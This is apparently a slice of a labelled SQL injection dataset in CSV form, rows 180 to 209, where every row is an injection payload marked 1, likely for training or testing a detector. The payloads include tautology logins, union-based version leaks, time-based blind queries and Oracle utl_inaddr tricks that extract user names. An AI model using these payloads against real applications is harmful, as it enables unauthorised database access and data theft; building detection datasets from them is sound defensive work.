row_index,payload_norm,label,sqli_type_hint
180,select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1,
181,"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1,
182,"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1,
183,1 and 1 = 1,1,
184,or 0 = 0 #,1,
185,union select * from users where login = char ...,1,
186,"select * from users where id = 1 union select 1||@,version ( ) -- 1",1,
187,admin' ) or '1' = '1'--,1,
188,1;SELECT *,1,
189,"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1,
190,x' and 1 = ( select count ( * ) from tabname ) ; --,1,
191,"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'",1,
192,"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1,
193,"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,
194,"1 or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
195,procedure,1,
196,or '' = ',1,
197,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i,1,
198,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,
199,\'; desc users; --,1,
200,"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1",1,
201,select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1,
202,""" or """"^""",1,
203,"""-""",1,
204,"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1",1,
205,"select * from users where id = 1 union select 1<@$,version ( ) -- 1",1,
206,"select * from users where id = 1 *\ union select null,@@VERSION -- 1",1,
207,"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'",1,
208,"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1,
209,admin'/*,1,
